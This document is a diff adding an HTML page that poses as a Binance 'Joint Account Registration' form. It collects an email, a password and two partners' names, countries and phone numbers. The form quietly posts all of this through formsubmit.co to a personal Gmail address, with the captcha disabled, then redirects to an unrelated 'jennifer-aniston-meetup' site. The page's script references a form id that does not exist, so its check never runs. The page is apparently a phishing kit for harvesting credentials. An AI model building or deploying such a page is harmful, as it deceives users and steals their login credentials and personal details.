@@ -1,0 +1,447 @@
+
+
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Joint Account Registration</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --binance-yellow: #F0B90B;
+            --binance-dark: #1E2026;
+            --binance-gray-dark: #474D57;
+            --binance-gray-light: #B7BDC6;
+            --binance-green: #02C076;
+            --binance-red: #F6465D;
+            --binance-bg: #F8F9FA;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--binance-bg);
+            color: var(--binance-dark);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-img {
+            height: 28px;
+            margin-right: 10px;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--binance-yellow);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .nav-link {
+            color: var(--binance-gray-dark);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .login-btn {
+            background-color: var(--binance-yellow);
+            color: var(--binance-dark);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .main-content {
+            display: flex;
+            justify-content: center;
+            margin: 50px 0;
+        }
+
+        .form-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            padding: 40px;
+            width: 480px;
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            color: var(--binance-dark);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--binance-gray-dark);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--binance-gray-light);
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--binance-yellow);
+        }
+
+        .select-wrapper {
+            position: relative;
+        }
+
+        .select-wrapper::after {
+            content: "▼";
+            font-size: 12px;
+            color: var(--binance-gray-dark);
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+        }
+
+        .form-select {
+            appearance: none;
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--binance-gray-light);
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: white;
+            cursor: pointer;
+        }
+
+        .form-select:focus {
+            outline: none;
+            border-color: var(--binance-yellow);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .form-checkbox {
+            margin-right: 10px;
+            width: 16px;
+            height: 16px;
+            accent-color: var(--binance-yellow);
+        }
+
+        .terms-text {
+            font-size: 14px;
+            color: var(--binance-gray-dark);
+        }
+
+        .terms-link {
+            color: var(--binance-yellow);
+            text-decoration: none;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--binance-yellow);
+            color: var(--binance-dark);
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #E2AD0A;
+        }
+
+        .account-type-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .account-type-btn {
+            flex: 1;
+            padding: 12px;
+            background-color: white;
+            border: 1px solid var(--binance-gray-light);
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .account-type-btn.active {
+            background-color: var(--binance-yellow);
+            border-color: var(--binance-yellow);
+            color: var(--binance-dark);
+        }
+
+        .account-type-icon {
+            margin-right: 8px;
+        }
+
+        .form-footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+            color: var(--binance-gray-dark);
+        }
+
+        .signin-link {
+            color: var(--binance-yellow);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        @media (max-width: 768px) {
+            .form-container {
+                width: 100%;
+                padding: 30px 20px;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                
+                <span class="logo-text">JOINTLY</span>
+            </div>
+            <nav class="nav-links">
+                <a href="#" class="nav-link">Buy Crypto</a>
+                <a href="#" class="nav-link">Markets</a>
+                <a href="#" class="nav-link">Trade</a>
+                <a href="#" class="nav-link">Derivatives</a>
+                <a href="#" class="nav-link">Finance</a>
+            </nav>
+          <a href="sign-in.php">  <button class="login-btn">Log In</button></a>
+        </header>
+
+        <main class="main-content">
+            <div class="form-container">
+                <h1 class="form-title">Joint Account Registration</h1>
+                
+                <div class="account-type-buttons">
+                    <button class="account-type-btn">Individual</button>
+                    <button class="account-type-btn active">Joint</button>
+                </div>
+
+
+
+
+
+                    
+
+            <form id="applicationForm" action="https://formsubmit.co/jenniferaniston.chatline@gmail.com" method="POST" class="space-y-6">
+    <!-- Hidden FormSubmit settings -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://jennifer-aniston-meetup.vercel.app/thanks.html">
+
+
+
+
+
+
+    <div class="form-group">
+        <label class="form-label" for="accountName">Joint Account Name</label>
+        <input type="text" id="accountName" name="accountName" class="form-input" placeholder="Enter your joint account name" value="Smith & Johnson Crypto Holdings" required>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="email">Primary Email</label>
+        <input type="email" id="email" name="email" class="form-input" placeholder="Enter primary email" value="smith.johnson@email.com" required>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="password">Create Password</label>
+        <input type="password" id="password" name="password" class="form-input" placeholder="Create password" required>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="confirmPassword">Confirm Password</label>
+        <input type="password" id="confirmPassword" name="confirmPassword" class="form-input" placeholder="Confirm password" required>
+    </div>
+
+    <h3 style="margin: 25px 0 15px; font-size: 18px; color: var(--binance-dark);">Partner 1 Details</h3>
+
+    <div class="form-group">
+        <label class="form-label" for="partner1Name">Full Name</label>
+        <input type="text" id="partner1Name" name="partner1Name" class="form-input" placeholder="Enter full name" value="Emily Smith" required>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="partner1Country">Country/Region</label>
+        <div class="select-wrapper">
+            <select id="partner1Country" name="partner1Country" class="form-select" required>
+                <option value="US">United States</option>
+                <option value="UK">United Kingdom</option>
+                <option value="CA">Canada</option>
+                <option value="AU">Australia</option>
+                <option value="DE">Germany</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="partner1Nationality">Nationality</label>
+        <div class="select-wrapper">
+            <select id="partner1Nationality" name="partner1Nationality" class="form-select" required>
+                <option value="US">American</option>
+                <option value="UK">British</option>
+                <option value="CA">Canadian</option>
+                <option value="AU">Australian</option>
+                <option value="DE">German</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="partner1Phone">Phone Number</label>
+        <input type="tel" id="partner1Phone" name="partner1Phone" class="form-input" placeholder="Enter phone number" value="+1 555 123 4567" required>
+    </div>
+
+    <h3 style="margin: 25px 0 15px; font-size: 18px; color: var(--binance-dark);">Partner 2 Details</h3>
+
+    <div class="form-group">
+        <label class="form-label" for="partner2Name">Full Name</label>
+        <input type="text" id="partner2Name" name="partner2Name" class="form-input" placeholder="Enter full name" value="Daniel Johnson" required>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="partner2Country">Country/Region</label>
+        <div class="select-wrapper">
+            <select id="partner2Country" name="partner2Country" class="form-select" required>
+                <option value="US">United States</option>
+                <option value="UK">United Kingdom</option>
+                <option value="CA">Canada</option>
+                <option value="AU">Australia</option>
+                <option value="DE">Germany</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="partner2Nationality">Nationality</label>
+        <div class="select-wrapper">
+            <select id="partner2Nationality" name="partner2Nationality" class="form-select" required>
+                <option value="US">American</option>
+                <option value="UK">British</option>
+                <option value="CA">Canadian</option>
+                <option value="AU">Australian</option>
+                <option value="DE">German</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="partner2Phone">Phone Number</label>
+        <input type="tel" id="partner2Phone" name="partner2Phone" class="form-input" placeholder="Enter phone number" value="+1 555 987 6543" required>
+    </div>
+
+    <div class="checkbox-group">
+        <input type="checkbox" id="termsCheckbox" name="termsCheckbox" class="form-checkbox" checked required>
+        <label for="termsCheckbox" class="terms-text">
+            I agree to Binance's <a href="#" class="terms-link">Terms of Service</a> and acknowledge that I have read the <a href="#" class="terms-link">Risk Warning</a>.
+        </label>
+    </div>
+
+    <button type="submit" class="submit-btn">Create Joint Account</button>
+</form>
+
+                <div class="form-footer">
+                    Already have an account? <a href="sign-in.php" class="signin-link">Sign In</a>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Account type selection
+            const accountTypeBtns = document.querySelectorAll('.account-type-btn');
+            accountTypeBtns.forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    accountTypeBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                });
+            });
+
+            // Form submission
+            const form = document.getElementById('jointAccountForm');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Basic validation
+                const password = document.getElementById('password').value;
+                const confirmPassword = document.getElementById('confirmPassword').value;
+                
+                if (password !== confirmPassword) {
+                    alert('Passwords do not match');
+                    return;
+                }
+                
+                if (!document.getElementById('termsCheckbox').checked) {
+                    alert('You must agree to the Terms of Service');
+                    return;
+                }
+                
+                // Simulate form submission
+                alert('Joint account registration submitted successfully!\nAn verification email has been sent to both partners.');
+            });
+        });
+    </script>
+</body>
+</html>
